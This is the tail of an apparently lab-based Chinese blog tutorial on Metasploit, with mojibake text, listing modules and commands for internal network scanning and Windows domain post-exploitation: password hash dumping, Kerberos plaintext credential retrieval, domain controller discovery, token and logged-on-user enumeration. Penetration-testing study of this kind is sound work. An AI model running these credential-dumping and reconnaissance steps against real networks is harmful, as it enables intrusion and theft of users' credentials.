<p>auxiliary/scanner/rdp/rdp_scanner #å‘ç°å†…ç½‘RDPæœåŠ¡ï¼ŒåŸºäºé»˜è®¤3389ç«¯å£</p>
<p>auxiliary/scanner/redis/redis_server<br>#å‘ç°å†…ç½‘RedisæœåŠ¡ï¼ŒåŸºäºé»˜è®¤6379ç«¯å£</p>
<p>auxiliary/scanner/db2/db2_version #æ¢æµ‹å†…ç½‘çš„db2æœåŠ¡ï¼ŒåŸºäºé»˜è®¤çš„</p>
<h1 id="åŸŸå†…æ“ä½œ"><a href="#åŸŸå†…æ“ä½œ" class="headerlink" title="åŸŸå†…æ“ä½œ"></a>åŸŸå†…æ“ä½œ</h1><p>å½“è·å–åˆ°åŸŸå†…ä¸»æœºçš„æƒ…å†µ,è·å–å…¶å®ƒåŸŸå†…ä¿¡æ¯,å¦‚<strong>åŸŸæ§</strong></p>
<h2 id="è·å–å½“å‰æ˜æ–‡å¯†ç ä¸å“ˆå¸Œ"><a href="#è·å–å½“å‰æ˜æ–‡å¯†ç ä¸å“ˆå¸Œ" class="headerlink" title="è·å–å½“å‰æ˜æ–‡å¯†ç ä¸å“ˆå¸Œ"></a>è·å–å½“å‰æ˜æ–‡å¯†ç ä¸å“ˆå¸Œ</h2><p><strong>hashdump</strong></p>
<p><strong>è¿˜å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤æŸ¥çœ‹</strong></p>
<p><strong>run post/windows/gather/smart_hashdump</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image39.png"></p>
<p><strong>creds_kerberos //è·å–æ˜æ–‡å¯†ç </strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image40.png"></p>
<h2 id="è·å–åŸŸæ§"><a href="#è·å–åŸŸæ§" class="headerlink" title="è·å–åŸŸæ§"></a>è·å–åŸŸæ§</h2><p>run post/windows/gather/enum_domains</p>
<p>run post/windows/gather/enum_domain</p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image41.png"></p>
<p>ä¸èƒ½å•ç‹¬ç”¨ä¸€æ¡å‘½ä»¤å»åˆ¤æ–­è¦ç»¼åˆè¯¥ä¸»æœºçš„ç½‘æ®µå»ç»“åˆåˆ¤æ–­ å¦‚ipconfig<br>/allã€arp -aç­‰</p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image42.png"></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image43.png"></p>
<p>ä¸€èˆ¬dnsæœåŠ¡å™¨ä¼šè¢«è®¾ä¸ºåŸŸæ§æ‰€ä»¥è¿™é‡ŒåŸŸæ§ä¾¿æ˜¯<strong>10.10.10.149</strong></p>
<p><strong>åç»­è¿˜å¯ä»¥é€šè¿‡net view è·å–åŸŸå†…ä¸»æœºï¼Œå†å»pingä¸»æœºä¹Ÿå¯ä»¥è¾¾åˆ°æ•ˆæœ</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image44.png"></p>
<h2 id="åŸŸæ”¶é›†"><a href="#åŸŸæ”¶é›†" class="headerlink" title="åŸŸæ”¶é›†"></a>åŸŸæ”¶é›†</h2><p><strong>net view /domain //æŸ¥çœ‹åŸŸ</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image45.png"></p>
<p><strong>net view /domain:hackbox //æŸ¥çœ‹åŸŸå†…çš„ä¸»æœº</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image46.png"></p>
<p>å‘ç°ä¸¤å°ä¸»æœº</p>
<p><strong>net group /domain //æŸ¥çœ‹åŸŸå†…å·¥ä½œç»„çš„ä¿¡æ¯</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image47.png"></p>
<h2 id="è·å–åŸŸå†…ç”¨æˆ·token"><a href="#è·å–åŸŸå†…ç”¨æˆ·token" class="headerlink" title="è·å–åŸŸå†…ç”¨æˆ·token"></a>è·å–åŸŸå†…ç”¨æˆ·token</h2><p><strong>run post/windows/gather/enum_domain_tokens</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image48.png"></p>
<h2 id="æŸ¥çœ‹ç›®æ ‡Windowsä¸Šç™»å½•çš„ç”¨æˆ·"><a href="#æŸ¥çœ‹ç›®æ ‡Windowsä¸Šç™»å½•çš„ç”¨æˆ·" class="headerlink" title="æŸ¥çœ‹ç›®æ ‡Windowsä¸Šç™»å½•çš„ç”¨æˆ·"></a>æŸ¥çœ‹ç›®æ ‡Windowsä¸Šç™»å½•çš„ç”¨æˆ·</h2><p><strong>run enum_logged_on_users -l</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image49.png"></p>
<p><strong>run post/windows/gather/enum_logged_on_users</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image50.png" alt="image50"></p>

	        
	      
	    </div>
	    
	  </div>
	  
	    
    <div class="copyright">
        <p><span>æœ¬æ–‡æ ‡é¢˜:</span><a href="/2022/04/02/msf/">Metasploit Framework</a></p>
        <p><span>æ–‡ç« ä½œè€…:</span><a href="/" title="è®¿é—®  çš„ä¸ªäººåšå®¢"></a></p>
        <p><span>å‘å¸ƒæ—¶é—´:</span>2022å¹´04æœˆ02æ—¥ - 00æ—¶00åˆ†</p>
        <p><span>æœ€åæ›´æ–°:</span>2022å¹´08æœˆ18æ—¥ - 23æ—¶38åˆ†</p>
        <p>
            <span>åŸå§‹é“¾æ¥:</span><a class="post-url" href="/2022/04/02/msf/" title="Metasploit Framework">https://mrfan6.github.io/2022/04/02/msf/</a>
            <span class="copy-path" data-clipboard-text="åŸæ–‡: https://mrfan6.github.io/2022/04/02/msf/ã€€ã€€ä½œè€…: " title="ç‚¹å‡»å¤åˆ¶æ–‡ç« é“¾æ¥"><i class="fa fa-clipboard"></i></span>
            <script src="/js/clipboard.min.js"></script>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>è®¸å¯åè®®:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="ä¸­å›½å¤§é™† (CC BY-NC-SA 3.0 CN)" target = "_blank">"ç½²å-éå•†ç”¨-ç›¸åŒæ–¹å¼å…±äº« 3.0"</a> è½¬è½½è¯·ä¿ç•™åŸæ–‡é“¾æ¥åŠä½œè€…ã€‚
        </p>
    </div>



<nav id="article-nav">
  
    <a href="/2022/08/18/vulnhub%E9%9D%B6%E6%9C%BAGOLDENEYE/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          GOLDENEYE-1
        
      </div>
    </a>
  
  
    <a href="/2022/04/01/NC%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">ç‘å£«å†›åˆ€nc</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>

	  
	</article>

    <div id="toc" class="toc-article">
    <strong class="toc-title">æ–‡ç« ç›®å½•</strong>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Metasploit-Framework-MSF"><span class="toc-number">1.</span> <span class="toc-text">Metasploit Framework(MSF)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">ä½¿ç”¨æ–¹æ³•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E7%9A%84%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.</span> <span class="toc-text">MSFçš„åŠŸèƒ½æ¨¡å—ä»‹ç»</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Auxiliaries-%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97"><span class="toc-number">1.2.1.</span> <span class="toc-text">Auxiliaries (è¾…åŠ©æ¨¡å—)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A8%A1%E5%9D%97%E6%88%96%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97"><span class="toc-number">1.2.2.</span> <span class="toc-text">Exploit (æ¼æ´åˆ©ç”¨æ¨¡å—æˆ–æ”»å‡»æ¨¡å—)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E6%A8%A1%E5%9D%97"><span class="toc-number">1.2.3.</span> <span class="toc-text">Payload (æ”»å‡»è½½è·æ¨¡å—)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit%E4%B8%AD%E7%9A%84-Payload-%E6%A8%A1%E5%9D%97%E4%B8%BB%E8%A6%81%E6%9C%89%E4%BB%A5%E4%B8%8B%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B%EF%BC%9A"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">Metasploitä¸­çš„ Payload æ¨¡å—ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼š</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Post-%E5%90%8E%E6%9C%9F%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97"><span class="toc-number">1.2.4.</span> <span class="toc-text">Post (åæœŸæ¸—é€æ¨¡å—)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Encoders-%E7%BC%96%E7%A0%81%E5%B7%A5%E5%85%B7%E6%A8%A1%E5%9D%97"><span class="toc-number">1.2.5.</span> <span class="toc-text">Encoders (ç¼–ç å·¥å…·æ¨¡å—)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Msfvenom%E7%94%9F%E6%88%90payload%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">Msfvenomç”Ÿæˆpayloadå‚æ•°è¯¦è§£</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E7%9A%84%E7%94%9F%E6%88%90%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">å¸¸ç”¨è„šæœ¬çš„ç”Ÿæˆï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux"><span class="toc-number">2.1.1.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows"><span class="toc-number">2.1.2.</span> <span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mac"><span class="toc-number">2.1.3.</span> <span class="toc-text">Mac</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">2.1.4.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASP"><span class="toc-number">2.1.5.</span> <span class="toc-text">ASP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSP"><span class="toc-number">2.1.6.</span> <span class="toc-text">JSP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAR"><span class="toc-number">2.1.7.</span> <span class="toc-text">WAR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-number">2.1.8.</span> <span class="toc-text">Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bash"><span class="toc-number">2.1.9.</span> <span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Perl"><span class="toc-number">2.1.10.</span> <span class="toc-text">Perl</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8msf%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BC%B9shell%E4%B8%8E%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">åˆ©ç”¨msfå®ç°åå¼¹shellä¸ææƒ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">3.1.</span> <span class="toc-text">ç¯å¢ƒ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.2.</span> <span class="toc-text">ç”Ÿæˆæœ¨é©¬</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali%E6%89%93%E5%BC%80apache%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.3.</span> <span class="toc-text">Kaliæ‰“å¼€apacheæœåŠ¡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali%E8%AE%BE%E7%BD%AE%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC"><span class="toc-number">3.4.</span> <span class="toc-text">Kaliè®¾ç½®è®¾ç½®ç›‘å¬</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0%E6%89%93%E5%BC%80msfconsole%E6%A8%A1%E5%9D%97"><span class="toc-number">3.4.1.</span> <span class="toc-text">â‘ æ‰“å¼€msfconsoleæ¨¡å—</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1%E4%BD%BF%E7%94%A8%E7%9B%91%E5%90%ACuse"><span class="toc-number">3.4.2.</span> <span class="toc-text">â‘¡ä½¿ç”¨ç›‘å¬use</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A2%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC%E7%9A%84payload"><span class="toc-number">3.4.3.</span> <span class="toc-text">â‘¢è®¾ç½®ç›‘å¬çš„payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A3%E8%AE%BE%E7%BD%AE%E9%80%89%E9%A1%B9options"><span class="toc-number">3.4.4.</span> <span class="toc-text">â‘£è®¾ç½®é€‰é¡¹options</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A4%E5%BC%80%E5%A7%8B%E6%89%A7%E8%A1%8C"><span class="toc-number">3.4.5.</span> <span class="toc-text">â‘¤å¼€å§‹æ‰§è¡Œ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%E6%94%BB%E5%87%BB%E6%9C%BA%E7%9A%84%E8%B5%84%E6%BA%90"><span class="toc-number">3.5.</span> <span class="toc-text">é¶æœºè¿›è¡Œè®¿é—®æ”»å‡»æœºçš„èµ„æº</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali%E5%8F%8D%E5%BC%B9shell%E6%88%90%E5%8A%9F"><span class="toc-number">3.6.</span> <span class="toc-text">Kaliåå¼¹shellæˆåŠŸ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.7.</span> <span class="toc-text">ææƒ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0getsystem"><span class="toc-number">3.7.1.</span> <span class="toc-text">â‘ getsystem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1bypassuac"><span class="toc-number">3.7.2.</span> <span class="toc-text">â‘¡bypassuac</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A2%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">3.7.3.</span> <span class="toc-text">â‘¢å†…æ ¸ææƒ</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8B%BFsystem"><span class="toc-number">4.</span> <span class="toc-text">å†…ç½‘æ‹¿system</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%80%9F%E5%8A%A9MSF%E6%8E%A2%E6%B5%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.</span> <span class="toc-text">å€ŸåŠ©MSFæ¢æµ‹å¯ææƒæ–¹æ³•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-SMB%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.2.</span> <span class="toc-text">2)SMBæœåŠ¡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0%E6%8E%A2%E9%92%88%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AFSMB%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.2.1.</span> <span class="toc-text">â‘ æ¢é’ˆå½“å‰ç³»ç»Ÿæ˜¯å¦å¼€å¯SMBæœåŠ¡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8%E5%AF%B9%E5%BA%94EXP"><span class="toc-number">4.2.2.</span> <span class="toc-text">â‘¡è¿›è¡Œåˆ©ç”¨å¯¹åº”EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A2%E6%8B%BF%E5%88%B0system%E6%9D%83%E9%99%90"><span class="toc-number">4.2.3.</span> <span class="toc-text">â‘¢æ‹¿åˆ°systemæƒé™</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8MSF%E5%BC%80%E5%90%AFsocke%E5%BC%80%E5%90%AF%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8"><span class="toc-number">5.</span> <span class="toc-text">åˆ©ç”¨MSFå¼€å¯sockeå¼€å¯å†…ç½‘æ¼«æ¸¸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A0%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="toc-number">5.1.</span> <span class="toc-text">â‘ æ·»åŠ è·¯ç”±</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A1%E5%BC%80%E5%90%AF%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%90%86%EF%BC%9A"><span class="toc-number">5.2.</span> <span class="toc-text">â‘¡å¼€å¯æœ¬åœ°ä»£ç†ï¼š</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A2%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%90%86%E6%8E%A5%E5%8F%A3%E8%AE%BF%E9%97%AE%E6%B5%8B%E8%AF%95"><span class="toc-number">5.3.</span> <span class="toc-text">â‘¢åˆ©ç”¨æœ¬åœ°ä»£ç†æ¥å£è®¿é—®æµ‹è¯•</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-1"><span class="toc-number">5.3.1.</span> <span class="toc-text">Linux:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-number">5.3.2.</span> <span class="toc-text">æµè§ˆå™¨</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B"><span class="toc-number">6.</span> <span class="toc-text">MSFè¿ç§»è¿›ç¨‹</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E7%9A%84"><span class="toc-number">6.1.</span> <span class="toc-text">ç›®çš„</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4"><span class="toc-number">6.2.</span> <span class="toc-text">å‘½ä»¤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="toc-number">7.</span> <span class="toc-text"> å†…ç½‘æ¢æµ‹</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-number">7.1.</span> <span class="toc-text">ä¸»æœºæ¢æµ‹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">7.2.</span> <span class="toc-text">ç«¯å£æ¢æµ‹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-number">7.3.</span> <span class="toc-text">ä¸»æœºæœåŠ¡æ¢æµ‹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%93%8D%E4%BD%9C"><span class="toc-number">8.</span> <span class="toc-text">åŸŸå†…æ“ä½œ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E4%B8%8E%E5%93%88%E5%B8%8C"><span class="toc-number">8.1.</span> <span class="toc-text">è·å–å½“å‰æ˜æ–‡å¯†ç ä¸å“ˆå¸Œ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7"><span class="toc-number">8.2.</span> <span class="toc-text">è·å–åŸŸæ§</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%94%B6%E9%9B%86"><span class="toc-number">8.3.</span> <span class="toc-text">åŸŸæ”¶é›†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7token"><span class="toc-number">8.4.</span> <span class="toc-text">è·å–åŸŸå†…ç”¨æˆ·token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87Windows%E4%B8%8A%E7%99%BB%E5%BD%95%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-number">8.5.</span> <span class="toc-text">æŸ¥çœ‹ç›®æ ‡Windowsä¸Šç™»å½•çš„ç”¨æˆ·</span></a></li></ol></li></ol>
</div>
<input type="button" id="tocButton" value="éšè—ç›®å½•"  title="ç‚¹å‡»æŒ‰é’®éšè—æˆ–è€…æ˜¾ç¤ºæ–‡ç« ç›®å½•">


<script src="//cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js"></script>


<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>

<script>
    var valueHide = "éšè—ç›®å½•";
    var valueShow = "æ˜¾ç¤ºç›®å½•";

    if ($(".left-col").is(":hidden")) {
        $("#tocButton").attr("value", valueShow);
    }
    $("#tocButton").click(function() {
        if ($("#toc").is(":hidden")) {
            $("#tocButton").attr("value", valueHide);
            $("#toc").slideDown(320);
        }
        else {
            $("#tocButton").attr("value", valueShow);
            $("#toc").slideUp(350);
        }
    })
    if ($(".toc").length < 1) {
        $("#toc, #tocButton").hide();
    }
</script>





<div class="bdsharebuttonbox">
	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="åˆ†äº«åˆ°æ–°æµªå¾®åš"></a>
	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="åˆ†äº«åˆ°å¾®ä¿¡"></a>
	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="åˆ†äº«åˆ°QQå¥½å‹"></a>
	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="åˆ†äº«åˆ°Facebook"></a>
	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="åˆ†äº«åˆ°Twitter"></a>
	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="åˆ†äº«åˆ°linkedin"></a>
	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="åˆ†äº«åˆ°å¤åˆ¶ç½‘å€"></a>
</div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>




    



    <div class="scroll" id="post-nav-button">
        
            <a href="/2022/08/18/vulnhub%E9%9D%B6%E6%9C%BAGOLDENEYE/" title="ä¸Šä¸€ç¯‡: GOLDENEYE-1">
                <i class="fa fa-angle-left"></i>
            </a>
        
        <a title="æ–‡ç« åˆ—è¡¨"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
        
            <a href="/2022/04/01/NC%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="ä¸‹ä¸€ç¯‡: ç‘å£«å†›åˆ€nc">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>
    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/08/18/vulnhub%E9%9D%B6%E6%9C%BAGOLDENEYE/">GOLDENEYE-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/02/msf/">Metasploit Framework</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/NC%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">ç‘å£«å†›åˆ€nc</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">æ–‡ä»¶åŒ…å«åˆ©ç”¨æ€è·¯</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/18/CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C/">CFSä¸‰å±‚ç½‘ç»œæ¸—é€</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/18/ICMP%E9%9A%A7%E9%81%93%E6%A8%A1%E5%BC%8F%E4%BD%BF%E7%94%A8/">ICMPéš§é“æ¨¡å¼ä½¿ç”¨</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/17/vulnhub%E9%9D%B6%E6%9C%BAOs-hackNos-1/">vulnhubé¶æœºOs-hackNos-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/16/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">Javaç½‘ç»œç¼–ç¨‹</a></li></ul>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
    <script>
        $(".post-list").addClass("toc-article");
        $(".post-list-item a").attr("target","_blank");
        $("#post-nav-button > a:nth-child(2)").click(function() {
            $(".fa-bars, .fa-times").toggle();
            $(".post-list").toggle(300);
            if ($(".toc").length > 0) {
                $("#toc, #tocButton").toggle(200, function() {
                    if ($(".switch-area").is(":visible")) {
                        $("#tocButton").attr("value", valueHide);
                        }
                    })
            }
            else {
            }
        })
    </script>



    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2022 mrfan6
            </div>
            <div class="footer-right">
                <a href="#" target="_blank">mrfan6</a>
            </div>
        </div>
        
    </div>
</footer>

    </div>
    
<script src="//cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js"></script>


<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>


<script src="/js/main.js"></script>


    <script>
        $(document).ready(function() {
            var backgroundnum = 24;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
